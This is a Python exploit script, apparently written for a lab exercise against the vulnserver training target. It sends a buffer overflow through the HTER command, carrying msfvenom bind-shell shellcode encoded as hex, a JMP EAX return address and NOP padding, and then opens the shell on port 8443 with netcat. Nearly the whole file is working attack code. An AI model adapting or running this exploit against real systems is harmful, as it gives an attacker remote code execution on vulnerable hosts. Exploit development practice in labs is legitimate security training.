#!/usr/bin/env python

import socket
import sys
import time
import telnetlib
import os
from struct import pack

def sendPayload(host, port, payload):
	try:
		# Sending connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		s.send('')
		data = s.recv(4096)
		print(data)
		s.send(payload)
		s.close()
	except:
		print "final length: {length}".format(length = len(payload))
		sys.exit-1()

def main():
	# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f python -v bindShell -b '\x00' LPORT=8443 | sed -e 's/\\x//g'
	# Payload size: 355 bytes
	# Final size of python file: 1916 bytes
	bindShell =  ""
	bindShell += "dadaba25281b83d97424f45e"
	bindShell += "31c9b15331561703561783cb"
	bindShell += "d4f976efcd7c780f0ee1f0ea"
	bindShell += "3f21667f6f91ec2d9c5aa0c5"
	bindShell += "172e6dea90854bc521b5a844"
	bindShell += "a2c4fca69b06f1a7dc7bf8f5"
	bindShell += "b5f0afe9b24d6c828940f477"
	bindShell += "5962d526d13df5c93636bcd1"
	bindShell += "5b73766aaf0f89bae1f02683"
	bindShell += "cd0236c4eafc4d3c098055fb"
	bindShell += "735ed31fd31543fbe5fa1288"
	bindShell += "eab751d6ee46b56d0ac238a1"
	bindShell += "9a901e65c6433e3ca2223f5e"
	bindShell += "0d9ae515a0cf9774ad3c9a86"
	bindShell += "2d2badf51ff40591137d8066"
	bindShell += "535474f8aa5785d16803d549"
	bindShell += "582cbe8965f92b81c0524e6c"
	bindShell += "b202cede5b49c1017b720b2a"
	bindShell += "148fb4741e06521ef04fccb6"
	bindShell += "32b4c5214c9e7dc505c8baea"
	bindShell += "95deec7c1e0d299d211819ca"
	bindShell += "b6d6c8b927e6c029cb758fa9"
	bindShell += "826518fec358516afec3cb88"
	bindShell += "03953408d866ba91add39881"
	bindShell += "6bdba4f5238a72a38564351d"
	bindShell += "5cda9fc91910208f257dd66f"
	bindShell += "9728af9018bd27e9445dc720"
	bindShell += "cd6d826864e64bf9346b6cd4"
	bindShell += "7b92efdc0361ef95062db746"
	bindShell += "7b3e5268283f77"

	# JMP EAX in essfunc.dll
	jmpEAX = 'B1115062'

	# Target Host
	host = '127.0.0.1'
	port = 9999

	# Bind port
	bport = 8443

	# Adjust ESP to avoid issues
	adjESP = "31C02D0126032A2D055A345E2D2678C87729C4"

	payload = 'HTER  ' + adjESP + bindShell + '90' * ((2040 - len(bindShell) - len(adjESP))/2) + jmpEAX + '\x90' * 1000

	#payload = 'HTER  ' + 'A' * 2040 + jmpEAX

	print('Total payload length: {0}'.format(len(payload)))

	print('\r\n\r\n[+] Sending Payload')
	sendPayload(host, port, payload)
	print('[+] Connecting to bind shell')
	time.sleep(1)
	os.system('nc {0} {1}'.format(host, bport))
	print('[+] Connection closed.')

if __name__ == "__main__":
	sys.exit(main())
